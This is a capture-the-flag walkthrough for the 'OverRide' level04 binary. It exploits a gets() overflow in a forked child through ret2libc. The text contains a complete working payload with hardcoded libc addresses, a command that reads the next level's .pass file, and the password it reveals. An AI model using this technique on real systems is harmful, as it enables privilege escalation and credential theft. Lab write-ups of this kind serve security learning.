For this exercise we have a binary which asks us for a shellcode:

level04@OverRide:~$ ./level04 
Give me some shellcode, k
AAAAAAAAAAAAAABBBBBBBBBBBBBBBCCCCCCCCCCCCCCCC
child is exiting...


Opening gdb we can see a call to fork() :

   0x080486d6 <+14>:	call   0x8048550 <fork@plt>
   0x080486db <+19>:	mov    %eax,0xac(%esp)

This means that level04 creates a child.
After the spawn of the child there is a check on the PID returned by fork :

   0x08048709 <+65>:	cmpl   $0x0,0xac(%esp)

The call to gets is where the exploit is :

   0x0804875e <+150>:	call   0x80484b0 <gets@plt>

This part is in the child code, so we need to access it.
Thanks to GDB we can set the option to follow the child :

	set follow-fork-mode child

By doing that we can fill the buffer and see the result.

The offset is 156.
We are going to do a ret2libc :

(gdb) p &system
$1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
(gdb) info proc map
process 1934
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
	 0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fda000 0xf7fdb000     0x1000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000,0xf7fcc000 "/bin/sh"
A syntax error in expression, near `"/bin/sh"'.
(gdb) find 0xf7e2c000,0xf7fcc000,  "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"

level04@OverRide:~$ (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "BBBB" + "\xec\x97\xf8\xf7"' ; cat) | ./level04 
Give me some shellcode, k
id
uid=1004(level04) gid=1004(level04) euid=1005(level05) egid=100(users) groups=1005(level05),100(users),1004(level04)
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN

